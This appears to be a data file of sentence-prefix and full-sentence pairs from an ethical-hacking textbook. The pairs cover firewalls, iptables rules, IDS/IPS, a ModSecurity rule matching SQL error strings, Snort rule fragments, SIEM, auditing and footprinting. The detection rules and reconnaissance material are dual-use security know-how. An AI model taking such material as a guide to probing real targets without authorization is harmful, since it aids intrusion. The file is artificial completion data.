there are sets of standards that provide guidance,there are sets of standards that provide guidance for organizations and are managed by standards bodies
the national institute of standards and technology ( nist ),"the national institute of standards and technology ( nist ) has a set of standards , documented in several special publications"
there are other standards documents that may be relevant to,"there are other standards documents that may be relevant to you , depending on where you are in the world"
the require- ments for each of those device types may,"the require- ments for each of those device types may be different , so the standards for them may be different"
"desktop systems may just be expected to take all updates as they come , with the expectation that any potential","desktop systems may just be expected to take all updates as they come , with the expectation that any potential outage could be remediated quickly on the off chance that there was an outage on a handful of users ’ desktops"
"servers , on the other hand , would be","servers , on the other hand , would be in place to service customers and possibly have revenue impacts"
"the standard , still focused on how to achieve the objective set out in the policy ,","the standard , still focused on how to achieve the objective set out in the policy , may say that there is a qual-ity assurance process that is necessary before patches may be deployed"
the service level agreement ( sla ) on those server,the service level agreement ( sla ) on those server systems may be completely different in terms of acceptable outages
"the standard for the server systems may be different from the desktop systems , but","the standard for the server systems may be different from the desktop systems , but both are written in service of the high-level policy that systems are kept up to date"
the standard would define anything that was vague ( what does “ up to,the standard would define anything that was vague ( what does “ up to date ” mean ? ) in the policy to make it relevant to operational staff
the standards are still high-level in the sense,the standards are still high-level in the sense of setting requirements for how policies should be implemented
"these provide guidance about how , specifically ,","these provide guidance about how , specifically , the standards are achieved at a very granular level"
"there may be multiple procedures for each standard , since","there may be multiple procedures for each standard , since there may be multiple organizations involved in imple-menting the standard"
you can see that with high-level guidance like that in a policy,"you can see that with high-level guidance like that in a policy , you likely wouldn ’ t have to touch it very often"
"policies are revisited on a regular basis , but the time scale for when the policies","policies are revisited on a regular basis , but the time scale for when the policies change would be measured in years , if the policies are well considered and well writ-ten"
as organizations in the company shift or responsibilities,"as organizations in the company shift or responsibilities shift , procedures will shift to accommodate them"
"additionally , a good procedure would have feedback loops built in","additionally , a good procedure would have feedback loops built in so the procedure could be regularly revised to be more efficient"
as we go through each layer from the top of the security program down to the very,"as we go through each layer from the top of the security program down to the very bottom , the result is more regular updates as we get to specific steps in implementation and administration"
"a guideline may provide information about best practices ,","a guideline may provide information about best practices , with the hope that the best practices may follow"
the best way to protect an enterprise is no longer about putting a firewall out in front of,"the best way to protect an enterprise is no longer about putting a firewall out in front of the network and considering yourself protected , even if that were ever the reality it was thought to be"
the assumption today is that prevention isn ’ t possible if,the assumption today is that prevention isn ’ t possible if the expectation is that 100 per- cent of attacks will be repelled
"just saying that a firewall is in place , though , doesn ’ t really","just saying that a firewall is in place , though , doesn ’ t really explain what is happening because there are several types of firewalls running up the network stack"
"the engine compartment is combustible , considering the","the engine compartment is combustible , considering the fuel , oxygen , and electricity mixture there"
car manufacturers put a fire-wall in to contain any fire that may,car manufacturers put a fire-wall in to contain any fire that may break out so it doesn ’ t spread to the passenger compart-ment
lots of devices offer the capability to filter packets,"lots of devices offer the capability to filter packets , which is sometimes accomplished with access control lists"
packet filters make determinations about the disposi-tion of,"packet filters make determinations about the disposi-tion of packets based on protocol , ports , and addresses"
"packets can be dropped , meaning they don ’ t get forwarded on to","packets can be dropped , meaning they don ’ t get forwarded on to the destination and there is also no response message sent to the originating system"
"they can also be rejected , meaning they won ’ t be sent to the destination but the rejecting device","they can also be rejected , meaning they won ’ t be sent to the destination but the rejecting device will send an internet control message protocol ( icmp ) error message to the sender indicating that the destination is unreachable"
"this is not only the polite approach , since drops will incur retransmits","this is not only the polite approach , since drops will incur retransmits , it ’ s also generally considered the correct approach from the protocol standpoint"
"a default deny policy , the most secure way to implement a","a default deny policy , the most secure way to implement a packet filter , will drop everything that isn ’ t explicitly allowed through"
"you may also have a default accept policy , which","you may also have a default accept policy , which means everything is allowed through unless something is explicitly blocked"
while the host-based firewall included in most linux distributions has other,"while the host-based firewall included in most linux distributions has other capabilities , it can also function as a basic packet filter"
"as an example , the following lines show running iptables to set a default deny policy on the","as an example , the following lines show running iptables to set a default deny policy on the input , output , and forward chains , which are collections of rules applied to specific message flows"
iptables policy settings iptables -p input drop iptables -p output dropiptables,iptables policy settings iptables -p input drop iptables -p output dropiptables -p forward drop packet filtering is very basic in its functionality
"while these packet filters can be good for inbound traffic or even for keeping internal users from accessing specific ports or ip addresses , they are","while these packet filters can be good for inbound traffic or even for keeping internal users from accessing specific ports or ip addresses , they are not good for more complex filtering , such as allowing inbound traffic that is a response to messages that originated on the inside of the network"
"for this , we need to keep track of those outbound","for this , we need to keep track of those outbound connections , so we need something more than just a packet filter"
stateful filtering not long after the initial development,stateful filtering not long after the initial development of packet filters came the development of stateful firewalls
these are firewall types we should know well because they,these are firewall types we should know well because they have been around for about three decades at this point
this means the firewall has to have a state table so,this means the firewall has to have a state table so it knows about all of the traffic flows passing through it
"in the case of the transmission control protocol ( tcp ) , it ’ s theoretically","in the case of the transmission control protocol ( tcp ) , it ’ s theoretically easier since the flags tell the story when it comes to the state of the traffic flow"
"as an example , the file transfer protocol ( ftp ) will sometimes originate","as an example , the file transfer protocol ( ftp ) will sometimes originate connections from the inside to the outside , mean-ing from the server to the client"
"in this case , the server to client connection for transferring the","in this case , the server to client connection for transferring the file is related to the control connection from the client to the server"
they watch messages coming in and going out and note them,they watch messages coming in and going out and note them along with their directionality in order to determine what the state is
"when you have a stateful firewall , you can not only make decisions based on","when you have a stateful firewall , you can not only make decisions based on the ports and addresses , you can also add in the state of a connection"
"for example , you can see a pair of iptables rules in the following code listing that allow all","for example , you can see a pair of iptables rules in the following code listing that allow all connections that are new or established into port 22 , which is the secure shell ( ssh ) port"
"iptables state rules iptables -a input -i eth0 -p tcp -- dport 22 -m state -- state \ new , established -j acceptiptables -a output -o eth0 -p tcp --","iptables state rules iptables -a input -i eth0 -p tcp -- dport 22 -m state -- state \ new , established -j acceptiptables -a output -o eth0 -p tcp -- sport 22 -m state -- state established \-j accept this gets us a little further in our capabilities to make decisions about what packets to allow or deny into our networks"
"while it doesn ’ t seem like a lot , these","while it doesn ’ t seem like a lot , these capabilities provide a lot of potential for keeping bad people out"
deep packet inspection one of the biggest issues when it,deep packet inspection one of the biggest issues when it comes to firewalls is that they allow known services through
attack traffic that uses the application against itself,attack traffic that uses the application against itself will set up connections just like any other client
"just looking at the protocol headers is insufficient ,","just looking at the protocol headers is insufficient , because everything will look correct and legal in the headers"
a deep packet inspection ( dpi ) firewall looks,a deep packet inspection ( dpi ) firewall looks beyond the headers and into the payload of the packet
a dpi firewall would require signatures that it should look for in the packet to determine whether,a dpi firewall would require signatures that it should look for in the packet to determine whether something is going to be malicious so it can block the traffic from coming into the network
"in order to do this , the firewall has to","in order to do this , the firewall has to parse the entire message before it can make any determinations"
"this means it has to have at least the entire packet ,","this means it has to have at least the entire packet , meaning any fragmentation at the ip layer has to arrive and be reassembled"
any message that doesn ’ t have the entire set of ip and tcp/ udp,"any message that doesn ’ t have the entire set of ip and tcp/ udp headers is likely a problem anyway , since that ’ s well under 100 bytes"
fragmenting a message at under 100 bytes could be a result of,"fragmenting a message at under 100 bytes could be a result of malicious traffic , trying to fool a firewall or other security solution"
"only looking at the headers is limiting , though , especially","only looking at the headers is limiting , though , especially since so many attacks today come in over the higher-layer protocols"
any man in the middle approach to encryption on the part of,any man in the middle approach to encryption on the part of the firewall violates the end-to-end expectation of most encryption solutions and users
"this means that with the move to encryption over all web-based connections ,","this means that with the move to encryption over all web-based connections , dpi fire-walls don ’ t do a lot to protect the web server"
"for example , in voice over ip ( voip ) networks ,","for example , in voice over ip ( voip ) networks , a device called a session border controller ( sbc ) can be used"
"as such , it can not only make determinations about the validity of the messaging but also open up dynamic pinholes to allow the","as such , it can not only make determinations about the validity of the messaging but also open up dynamic pinholes to allow the real-time transport protocol ( rtp ) media messages through , since they would be over different ports and protocols than the signaling messages would be"
"an sbc would be an example of an application layer firewall ,","an sbc would be an example of an application layer firewall , since it has the capabil- ity of making decisions about allowing traffic through"
it makes these decisions based on understanding the application,it makes these decisions based on understanding the application layer protocol and common state flows of that protocol
"while there are sev-eral commercial wafs , there is also modsecurity ,","while there are sev-eral commercial wafs , there is also modsecurity , which is an open-source module that can be used with apache web servers"
mod-security rule secrule response_body `` @ rx ( ? i ) ( ? : supplied argument is not a valid mysql|column count does n't match value count at row|mysql_fetch_array\ ( \ ) |on mysql result index|you have an error in your,mod-security rule secrule response_body `` @ rx ( ? i ) ( ? : supplied argument is not a valid mysql|column count does n't match value count at row|mysql_fetch_array\ ( \ ) |on mysql result index|you have an error in your sql syntax ; |you have an error in your sql syntax near|mysql server version for the right syntax to use|\ [ mysql\ ] \ [ odbc|column count does n't match|table ' [ ^ ' ] + ' does n't exist|sql syntax
"if the rule matches , the regular expression match will be","if the rule matches , the regular expression match will be placed into the transaction variable collection because of the capture action"
"in addition to capturing information , which can be logged and referred to","in addition to capturing information , which can be logged and referred to later or be used for alerting , modsecurity can block as an action"
"sometimes , a waf like modsecurity is implemented on the edge of the network as a reverse proxy , so clients send messages to the reverse proxy","sometimes , a waf like modsecurity is implemented on the edge of the network as a reverse proxy , so clients send messages to the reverse proxy , which handles the message on behalf of the server , parsing it for potential bad requests , before sending it on to the actual web server"
any device that can make decisions based on what is happening in the application layer protocol and then have the,"any device that can make decisions based on what is happening in the application layer protocol and then have the ability to drop the message , regardless of the application layer protocol , could be considered an application layer firewall"
"users are often the most vulnerable point on your network ,","users are often the most vulnerable point on your network , and they are regularly targets of social engineering and malware attacks"
a unified threat management ( utm ) device is one that consolidates a lot of security,a unified threat management ( utm ) device is one that consolidates a lot of security functions into a single system that may be placed at a single point in the network
"this utm would replace the firewall , intrusion detection ,","this utm would replace the firewall , intrusion detection , and intrusion protection devices as well as offering antivirus protection"
"if your firewall failed , for instance , you would still have intrusion","if your firewall failed , for instance , you would still have intrusion detection systems to catch anything that got through , if that had happened"
"with utm , you have one place and it needs to","with utm , you have one place and it needs to work all the time and be configured correctly all the time"
intrusion detection systems there are two different types,intrusion detection systems there are two different types of intrusion detection systems idss that you can find
one of the challenges with a host-based ids is that once an attacker is in a position to trig-ger a host-based ids,"one of the challenges with a host-based ids is that once an attacker is in a position to trig-ger a host-based ids , they are on the system , which means they can become aware that the ids is in place and make plans accordingly"
"where firewalls have the ability to block or allow packets in the network stream ,","where firewalls have the ability to block or allow packets in the network stream , a network ids can take some of the same sorts of rules and generate log messages"
as long as you can create some sort of identification for the messages you,"as long as you can create some sort of identification for the messages you want to log or alert on , you can write a rule for an ids"
"there are also some open-source options , one of the biggest names being snort , which is","there are also some open-source options , one of the biggest names being snort , which is currently owned by cisco , but free access to the program and some community rules is still offered"
one of these approaches is to place the ids connected in parallel rather than in series,one of these approaches is to place the ids connected in parallel rather than in series at the very perimeter of the network so all net-work traffic coming in can be observed
"3 shows a simplified diagram using this approach , with the","3 shows a simplified diagram using this approach , with the ids behind the firewall but not in the traffic flow directly"
traffic gets shunted to the ids so it can detect,traffic gets shunted to the ids so it can detect without getting in the way or causing a network failure
another approach is to place sensors in different parts of,another approach is to place sensors in different parts of the network so you don ’ t have a single device
this isn ’ t the case any longer because process-ing power,"this isn ’ t the case any longer because process-ing power has increased considerably , as has overall bus throughput in systems"
"even so , using multiple sensors across different parts","even so , using multiple sensors across different parts of the network can allow for sharing the processing load"
"just as with waf rules , it takes some time and effort to understand how to write","just as with waf rules , it takes some time and effort to understand how to write rules , espe-cially in cases where what you are trying to detect on is content in the packets"
"in the fol-lowing code listing , you will see two","in the fol-lowing code listing , you will see two snort rules that demonstrate some of what snort can do"
com/advisories/high-risk-vulnerability-in- ingres-stack-overflow ; classtype : attempted-admin ; sid:12027 ;,com/advisories/high-risk-vulnerability-in- ingres-stack-overflow ; classtype : attempted-admin ; sid:12027 ; rev:11 ; ) snort rules start with an action
"you can alert , as is done in both of these rules","you can alert , as is done in both of these rules , which generates an alert message to whatever is configured for output"
"some of these capabilities take us beyond traditional ids functionality ,","some of these capabilities take us beyond traditional ids functionality , but they are actions that snort can take in rule configurations"
"in our case , we are alerting on a tcp message , so we need","in our case , we are alerting on a tcp message , so we need to specify not only a source and destination address but also a source and desti-nation port"
snort is aware of which side is the cli-ent and which is the,"snort is aware of which side is the cli-ent and which is the server , so you can indicate which side the message should come from"
"the important part comes next , where we specify","the important part comes next , where we specify what the packet should contain to match on this rule"
"while this is configurable , there are conventions","while this is configurable , there are conventions about numbers that should be used for user-defined rules"
the alert assumes that someone is paying attention to what the ids,the alert assumes that someone is paying attention to what the ids is emitting and taking actions based on the alert and a subsequent investigation
snort monitors network traffic and parses through it to identify packets,"snort monitors network traffic and parses through it to identify packets that contain possibly malicious contents , as identified by the rules"
"in order to have snort run as an ips , it has to be placed inline ,","in order to have snort run as an ips , it has to be placed inline , meaning it has to be a device in the path of traffic into and out of the network"
any ips would have to be similarly configured in,any ips would have to be similarly configured in order to have the ability to block any network traffic
the difference between an ips and a firewall is that,the difference between an ips and a firewall is that the “ firewall rules ” on an ips would be dynamic
"rather than having large blanket rules blocking ip addresses wholesale ,","rather than having large blanket rules blocking ip addresses wholesale , the ips would make decisions based on the contents of the packet"
the rule would be in place for the duration,the rule would be in place for the duration of the packet passing through the ips—essentially a one-off
"the rule may just exist to handle that one packet , or it may be","the rule may just exist to handle that one packet , or it may be in use for a longer period , but the rules are dynamic and temporary by nature"
"also while inline , either the ips can choose to drop the message ,","also while inline , either the ips can choose to drop the message , meaning just discard it , or it can reject it with an appropriate message"
"in several cases of running a basic snort installation with the community rules , i have run across","in several cases of running a basic snort installation with the community rules , i have run across alerts indicating bad sip messages , when in fact the traffic was http over port 80 , not sip"
"rules are not infallible , so it is possible for rules to catch legitimate traffic , and","rules are not infallible , so it is possible for rules to catch legitimate traffic , and if you are running an ips , you may end up blocking messages from customers or partners"
"this is a factor of the number of rules you have , how well they are written ,","this is a factor of the number of rules you have , how well they are written , and how much traffic you get into your network , as well as the placement of your sensors"
"alerting is a significant challenge , and it can require a lot of work to fine-tune rules so your analysts , or whoever is looking at the alerts , don ’ t","alerting is a significant challenge , and it can require a lot of work to fine-tune rules so your analysts , or whoever is looking at the alerts , don ’ t become screen-blind , meaning they get so used to seeing the same alerts over and over that they end up missing one that is legitimate—a white rabbit in a field of white snow/noise"
security information and event management a good practice from the,security information and event management a good practice from the standpoint of both system administration and security is system logging
if you ’ ve ever had to troubleshoot a system or application that has failed,"if you ’ ve ever had to troubleshoot a system or application that has failed without having any logs to look at , you will understand the value of logs"
"they also consume pro-cessing power , and more logging can actually make it harder to find problems because","they also consume pro-cessing power , and more logging can actually make it harder to find problems because you ’ re having to wade through enormous volumes of text to find one entry that will help you"
"in the case of security inci- dents , these","in the case of security inci- dents , these log management systems can also include search and correlation tools"
"while there are many log management solutions , many organizations are","while there are many log management solutions , many organizations are moving to something called security information and event management ( siem )"
5 kibana interface to the elastic stack the elastic stack is,5 kibana interface to the elastic stack the elastic stack is a good platform to ingest large amounts of data from multiple sources
5 is a listing of the dns responses that have,5 is a listing of the dns responses that have been seen by the systems reporting to this elastic stack installation
it will also provide a large number of visualization options,it will also provide a large number of visualization options based on the data that is being provided to it
"a security operations center ( soc ) will often be built around monitoring systems , including","a security operations center ( soc ) will often be built around monitoring systems , including a siem system that can be used to correlate data from a number of different sources"
the advantage to using siem is being able to pull a lot of data,the advantage to using siem is being able to pull a lot of data together so you can get a broader picture of what is happening across the network
seeing an attack in isolation may get you to focus on the one attack you are,"seeing an attack in isolation may get you to focus on the one attack you are looking at , rather than recognizing that there are several other systems that are also being attacked"
having data points can help to ensure that the,having data points can help to ensure that the right controls are in place to protect information assets
"it ’ s been said that the only secure computer ( and , by extension , network ) is one that","it ’ s been said that the only secure computer ( and , by extension , network ) is one that has had all of the cables cut and , ideally , filled with cement and dropped to the bottom of the ocean"
"if you want to do anything with a computer , you are","if you want to do anything with a computer , you are exposing your-self to the potential for that computer to become infected or compromised"
implementing security solutions requires understanding where your,implementing security solutions requires understanding where your resources are—this is not only information assets
you can take care of the technology aspects with,you can take care of the technology aspects with a defense in depth approach to security design and architecture
"as mentioned earlier , having logs is really","as mentioned earlier , having logs is really important when it comes to responding to security events"
"if an invader somehow man-ages to breach one of the walls , the people fall back","if an invader somehow man-ages to breach one of the walls , the people fall back into the next ring until , if necessary , they end up inside the final wall"
"hopefully , invaders will either give up or be defeated","hopefully , invaders will either give up or be defeated as they try to make it through seven enormous walls"
"as discovered in the book return of the king , though ,","as discovered in the book return of the king , though , even seven walls aren ’ t always sufficient for defense of the city"
"the reason minas tirith comes to mind , in case it ’ s","the reason minas tirith comes to mind , in case it ’ s not clear , is because it ’ s an example of defense in depth"
"using a defense in depth approach , you would design a","using a defense in depth approach , you would design a layered network with multiple security gateways to control access between layers"
"when a defense in depth strategy is used , as an","when a defense in depth strategy is used , as an adversary moves through the layers of the network , they leave traces"
"the hope is the detection happens , leading to shutting down","the hope is the detection happens , leading to shutting down the attack , before the adversary gets to any really sensitive information"
this doesn ’ t necessarily mean that you just,this doesn ’ t necessarily mean that you just keep placing the same controls back to back every-where
"anyone with physical access to a system has the potential to get logged into the system—as an example , there may","anyone with physical access to a system has the potential to get logged into the system—as an example , there may already be a user logged in and if the system isn ’ t locked , anyone could become the logged in user"
"this is what i ’ ve been talking about—firewalls ,","this is what i ’ ve been talking about—firewalls , intrusion detection systems , siems , and other security technology"
any hard - ware or software that is in,any hard - ware or software that is in place to prevent unauthorized use would be a technical control
this may include policies or practices like hiring,"this may include policies or practices like hiring standards , background checks , and data handling policies"
these administrative controls set the tone for how,"these administrative controls set the tone for how the organization is protected , and they are essential"
"the first is a demilitarized zone , which is where servers","the first is a demilitarized zone , which is where servers that are untrusted but still part of the corporate network reside"
the other side of the firewall is where you,the other side of the firewall is where you might put internal servers like active directory or file serv-ers
6 defense in depth network design dmz desktop networkinternal serversexternal firewall internal firewall intrusion detection systemintrusion detection system,6 defense in depth network design dmz desktop networkinternal serversexternal firewall internal firewall intrusion detection systemintrusion detection system desktop with endpoint protection a second firewall protects the internal network from the server network and vice versa
"of course , there is more to it than even just","of course , there is more to it than even just the network design , the technology , and the policies and procedures"
"defense in breadth for several years now , there has been something of a","defense in breadth for several years now , there has been something of a debate between the advantages of defense in depth versus those of defense in breadth"
is defense in depth sufficient or do organizations need to be implementing defense in breadth ?,"is defense in depth sufficient or do organizations need to be implementing defense in breadth ? of course , the challenge to defense in breadth is that it is rarely explained very well"
"if you search for explanations of defense in breadth , you will find a lot of rationale for why defense in breadth is a","if you search for explanations of defense in breadth , you will find a lot of rationale for why defense in breadth is a good thing and why defense in depth in and of itself is insufficient for a modern strategy to implement security solutions within an organization"
my understanding of defense in breadth over the years has been that,my understanding of defense in breadth over the years has been that it ’ s all the surround that is missing from defense in depth
the organization is meant to evaluate risk and take a systemic look at how to mitigate,"the organization is meant to evaluate risk and take a systemic look at how to mitigate any risk , taking into account the threats that the organization expects to be exposed to"
in order to fully evaluate risk and take a comprehensive,"in order to fully evaluate risk and take a comprehensive look at potential solutions , an organization needs to have data"
this is especially true in an era where the old technical attacks of exploiting vulnerabilities,this is especially true in an era where the old technical attacks of exploiting vulnerabilities in listening services exposed to the outside world are no longer the vectors of choice
"instead , going after the user is more productive , so","instead , going after the user is more productive , so social engineering attacks and a lot of malware are more common"
"as a result , the best approach to security is not to focus primarily on prevention","as a result , the best approach to security is not to focus primarily on prevention but instead , assume that you will get breached at some point and prepare for response"
the members of the security team are not always the best people to,"the members of the security team are not always the best people to respond to events , especially since they may not always be aware of them"
a growing trend in the information technology ( it ) space is the,"a growing trend in the information technology ( it ) space is the collaboration between development teams and operations teams , commonly referred to as devops"
companies that are even more forward-thinking are also,companies that are even more forward-thinking are also ensuring that security is merged in along the way
these approaches focus not only on teamwork and the,these approaches focus not only on teamwork and the associated communication that is necessary but also on automation
"automating builds , testing , and deployment takes a lot of","automating builds , testing , and deployment takes a lot of the human factor out , helping to avoid misconfigurations or other mistakes"
you can see that defense in breadth can be a very complicated idea that may be difficult,you can see that defense in breadth can be a very complicated idea that may be difficult to fully implement once you start thinking about where you can inject security conversa-tions into your organization
"ultimately , though , the goal of defense in breadth is to be better positioned to not only protect the organization","ultimately , though , the goal of defense in breadth is to be better positioned to not only protect the organization but also respond to attacks—also , to respond to a breach with the goal of restoring business operations as quickly as possible"
"beyond that , it ’ s not just logging on systems—desktop or","beyond that , it ’ s not just logging on systems—desktop or server—but also on network equipment like routers and switches and certainly firewalls"
"even in cases where you are running an ids in the network , you may not always want to","even in cases where you are running an ids in the network , you may not always want to alert , because there may be some events that you don ’ t feel it necessary to follow up on"
"many systems , including unix-like systems as well","many systems , including unix-like systems as well as network devices , will support the syslog protocol"
this is a logging protocol that began as the logging mechanism,this is a logging protocol that began as the logging mechanism for the simple mail transfer protocol ( smtp ) server sendmail
"over the years since the 1980s , when syslog was first implemented in sendmail , it has become the standard","over the years since the 1980s , when syslog was first implemented in sendmail , it has become the standard logging solution on unix-like systems , and the protocol has been documented in rfc 3164 , later standard-ized in rfc 5424"
syslog not only has an easy-to-understand syntax in the creation and reading of messages,"syslog not only has an easy-to-understand syntax in the creation and reading of messages , it also can be used for remote logging as well as local logging"
"any attacker who gets access to a system may be able to wipe the local logs , but if they are","any attacker who gets access to a system may be able to wipe the local logs , but if they are streaming off the system , they are retained for later use , unless the attacker can compromise the central log host"
"any messages related to authentication , for example , can be","any messages related to authentication , for example , can be put into a single file , away from other types of messages"
each facility can be routed to a different file or even a different,"each facility can be routed to a different file or even a different system , if you wanted some log messages stored locally and others stored centrally"
this means applications can determine the level of an event,"this means applications can determine the level of an event , including informational , debug , warning , and error"
instead of the text-based messages that syslog uses,"instead of the text-based messages that syslog uses , the event subsystem uses a binary storage system"
"of course , one advantage of the way the event subsystem stores data","of course , one advantage of the way the event subsystem stores data is that it can be queried , as though it were a database"
"while it ’ s not as easy to parse mes-sages , the fact that","while it ’ s not as easy to parse mes-sages , the fact that you can query messages means you can easily return related messages with a single query"
"in addition to the differ - ent categories , such as","in addition to the differ - ent categories , such as system , security , and application , there are event ids"
searching for the event id can give you every instance,"searching for the event id can give you every instance of a particular event , which may occur across multiple processes"
"7 event viewer in both cases , application developers","7 event viewer in both cases , application developers can make use of the system-provided logging func - tionality"
"on the unix side , any developer can write to syslog and the syslog service","on the unix side , any developer can write to syslog and the syslog service will take care of writing the logs out based on the definition in the configuration file"
this takes the onus of developing logging schemes off the developers,this takes the onus of developing logging schemes off the developers and also ensures a single place to go for log messages
the application can even have its own log file,the application can even have its own log file and windows will break the logs out to separate locations
"if you were to go into the event viewer application , you would be able to","if you were to go into the event viewer application , you would be able to look at all the event log entries and the different categories the event logs fell into"
any application could have its own entry in that list to keep the logs separate from,any application could have its own entry in that list to keep the logs separate from the system while it ’ s still logged to the same location as all the other logs
"auditing logs are important , and we generally rely on application developers to implement","auditing logs are important , and we generally rely on application developers to implement logging and , ideally , configurable logging , meaning different levels of log messages"
"if the audit events are triggered , they will show","if the audit events are triggered , they will show up in the security log in the windows event viewer"
8 audit policy in windows on the linux,"8 audit policy in windows on the linux side , there is a completely different auditing infrastructure"
763:341 ) : pid=9711 uid=0 auid=0 ses=30,763:341 ) : pid=9711 uid=0 auid=0 ses=30 msg='op=login id=0 exe= '' /usr/sbin/sshd '' hostname=binkley
765:342 ) : pid=9711 uid=0 auid=0 ses=30,765:342 ) : pid=9711 uid=0 auid=0 ses=30 msg='op=login id=0 exe= '' /usr/sbin/sshd '' hostname=binkley
424:353 ) : auid=4294967295 ses=4294967295 op=add_rule key= (,424:353 ) : auid=4294967295 ses=4294967295 op=add_rule key= ( null ) list=4 res=1 type=service_start msg=audit ( 1530130271
424:354 ) : pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=auditd comm= '' systemd '' exe= '',424:354 ) : pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=auditd comm= '' systemd '' exe= '' /usr/lib/systemd/systemd '' hostname= ? addr= ? terminal= ? res=success ' type=syscall msg=audit ( 1530130283
962:355 ) : arch=c000003e syscall=59 success=yes exit=0 a0=106e000 a1=1063a90 a2=10637e0 a3=7ffec3721e70 items=2 ppid=9711 pid=9908 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0,962:355 ) : arch=c000003e syscall=59 success=yes exit=0 a0=106e000 a1=1063a90 a2=10637e0 a3=7ffec3721e70 items=2 ppid=9711 pid=9908 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=30 comm= '' cat '' exe= '' /usr/bin/cat '' key= ( null ) type=execve msg=audit ( 1530130283
962:355 ) : item=0 name= '' /usr/bin/cat '' inode=2799 dev=fd:00 mode=0100755,962:355 ) : item=0 name= '' /usr/bin/cat '' inode=2799 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=normal cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0 type=path msg=audit ( 1530130283
2 '' inode=33559249 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00,2 '' inode=33559249 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=normal cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0 type=proctitle msg=audit ( 1530130283
962:355 ) : proctitle=6361740061756469742e6 c6f67 each entry provides details about the type,"962:355 ) : proctitle=6361740061756469742e6 c6f67 each entry provides details about the type of the entry , which indicates what the audit subsystem has detected"
you can make the changes directly in the configuration files or you,you can make the changes directly in the configuration files or you can add the rules on the command line using the auditctl command
what go into the configuration file are the,what go into the configuration file are the command-line parameters that would get passed to auditctl
the first are the three elemental properties,"the first are the three elemental properties of information security—confidentiality , integ-rity , and availability"
"finally , availabil-ity means information , including services ,","finally , availabil-ity means information , including services , is available when it is expected to be available"
"beyond the triad , as confidentiality , integrity , and availability are known , is","beyond the triad , as confidentiality , integrity , and availability are known , is the parkerian hexad , which adds in utility , authenticity , and possession or control"
stateful firewalls factor in the state of the connection,stateful firewalls factor in the state of the connection when it comes to deci-sions about allowing or blocking traffic
"finally , unified threat management devices , which some call next-generation firewalls ,","finally , unified threat management devices , which some call next-generation firewalls , can take firewall functionality to a new level by also adding in antivirus"
the antivirus looks at the network stream for malware,the antivirus looks at the network stream for malware rather than waiting until it gets to the endpoint
these are devices that are aware of the application layer protocols and can make decisions about the packets,these are devices that are aware of the application layer protocols and can make decisions about the packets based on whether the traffic matches to allowed endpoints and whether the flow is correct based on the protocol
a defense in depth strategy applies layers not only to the placement of the technology but,"a defense in depth strategy applies layers not only to the placement of the technology but also to the policies , procedures , and standards that are required to guide the security functions"
defense in breadth adds in a broader view to defense,defense in breadth adds in a broader view to defense in depth with a lot of additional surround across the organization
"this may include awareness training , detection , preparation for","this may include awareness training , detection , preparation for response , and other capabilities that are beyond just preventing attacks"
"however , from a technology standpoint , logging and auditing","however , from a technology standpoint , logging and auditing can be very helpful when it comes time to respond"
"logging may be system logging or application logging , where there","logging may be system logging or application logging , where there is a trail of actions that have been determined by the programmer"
"when it comes to auditing , windows auditing capabilities include success or","when it comes to auditing , windows auditing capabilities include success or failure logs for access to files , users , or other system objects"
"on the linux side , audit rules can be written","on the linux side , audit rules can be written to watch files and directories as well as system calls"
to remove malware from the network before it gets to the,"to remove malware from the network before it gets to the endpoint , you would use which of the following ? a"
if you were on a client engagement and discovered that you left an external hard drive,"if you were on a client engagement and discovered that you left an external hard drive with essential data on it at home , which security principle would you be violating ? a"
what would be necessary for a tcp conversation to,what would be necessary for a tcp conversation to be considered established by a stateful firewall ? a
which information would a packet filter use to make decisions,which information would a packet filter use to make decisions about what traffic to allow into the network ? a
"the process of getting the size and scope of the target is called footprinting—in other words , the attacker","the process of getting the size and scope of the target is called footprinting—in other words , the attacker , or you , the ethical hacker , is trying to pick up the footprint of the target organization"
"when it comes to ethi-cal hacking , you may have some help","when it comes to ethi-cal hacking , you may have some help from the target , who would have employed you for your services"
they may provide you with some footholds to get a sense,they may provide you with some footholds to get a sense of the scope and scale of what you should be doing
"there are a lot of places you , as an ethical","there are a lot of places you , as an ethical hacker , can get information about your tar- gets , though"
open-source intelligence is the term that describes identifying,open-source intelligence is the term that describes identifying information about your target using freely available sources
"there are other places where you can acquire information in other than legal ways , and of course , you","there are other places where you can acquire information in other than legal ways , and of course , you could directly infiltrate a company ’ s physical locations to get some information that you can use against your target"
the objective here is to acquire data that you need,the objective here is to acquire data that you need without tipping off your target that you are doing it
you can also gather a lot of details by interacting,you can also gather a lot of details by interacting with services at the target in ways that would be expected
"as an example , you might visit their website requesting pages","as an example , you might visit their website requesting pages , just as any other visitor to their site might do"
"however , if you know where to look , you can gather","however , if you know where to look , you can gather a lot of information about systems and technology in use by your target"
"this data can be mined , and you can get a better understanding about your","this data can be mined , and you can get a better understanding about your target and systems and the ip address blocks that may be associated with your target"
"over the course of this chapter , we ’ ll go over sources of information","over the course of this chapter , we ’ ll go over sources of information about your target as well as the tools you would use to gather that information"
while much of it is quiet and there is at least one,"while much of it is quiet and there is at least one tool that is entirely passive , there is some active investigation as well"
"the first place to start , though , is how to use open","the first place to start , though , is how to use open sources of data to identify a jumping-off point for getting information about your target"
"in that case , you need to locate as much information as you can","in that case , you need to locate as much information as you can so you know not only what your attack surface looks like but pos-sible ways in"
the second reason is that organizations aren ’ t always,the second reason is that organizations aren ’ t always aware of the amount of informa- tion they are leaking
"as noted earlier , attackers can find footholds ,","as noted earlier , attackers can find footholds , as well as potential human targets for social engineering attacks"
"if you are working hand in hand with the company you are performing testing for ( that is , you are doing white box testing ) ,","if you are working hand in hand with the company you are performing testing for ( that is , you are doing white box testing ) , you don ’ t need to use open-source intelligence for starting points , but you should still gather what information is available for the awareness of the company"
"even if there isn ’ t anything that could be pulled back , they could work","even if there isn ’ t anything that could be pulled back , they could work on aware-ness so employees and the organization as a whole aren ’ t leaking information unnecessarily"
